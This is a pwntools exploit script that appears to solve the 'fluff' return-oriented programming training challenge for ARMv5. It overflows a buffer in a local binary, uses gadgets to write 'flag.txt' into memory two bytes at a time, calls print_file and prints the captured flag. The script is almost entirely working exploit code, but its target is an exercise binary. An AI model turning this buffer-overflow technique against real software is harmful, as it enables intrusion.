from pwn import *

elf = ELF("fluff_armv5-hf")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0xb0
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 512

MEMORY = elf.bss(0x800)
PATH = b'flag.txt'

# ARM
CALL_GADGET = next(elf.search(asm('pop {r0, r1, r3} ; bx r1'))) # questionableGadgets
REGS_GADGET = next(elf.search(asm('pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}')))
PC_GADGET = next(elf.search(asm('pop {fp, pc}'))) # not strictly needed, but allows chaining setup calls better
# THUMB
STR_GADGET = next(elf.search(asm('strh r0, [r7, #0x1e] ; nop ; lsrs r6, r5, #3 ; movs r1, r0 ; lsrs r4, r4, #3 ; movs r1, r0 ; bx lr', arch='thumb'))) | 1  # the only valid THUMB str instruction among the ones found

HALFBYTES = context.bytes // 2 # strh writes 16-bit values

def setup(r0, r7):
    return [CALL_GADGET, r0, REGS_GADGET, 0, [0] * 5, r7 - 0x1e, [0] * 2, PC_GADGET, STR_GADGET, 0]

def pieces(i, value=PATH, memory=MEMORY):
    return (unpack(value[i * HALFBYTES:(i + 1) * HALFBYTES] + b'\0\0'), memory + i * HALFBYTES)

def main():
    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    # write flag in halves
    [rop.raw(setup(*pieces(i))) for i in range(len(PATH) // (HALFBYTES))]
    # call print_file with flag path as argument
    rop.raw([CALL_GADGET, MEMORY, elf.plt.print_file, 0])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE
    
    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
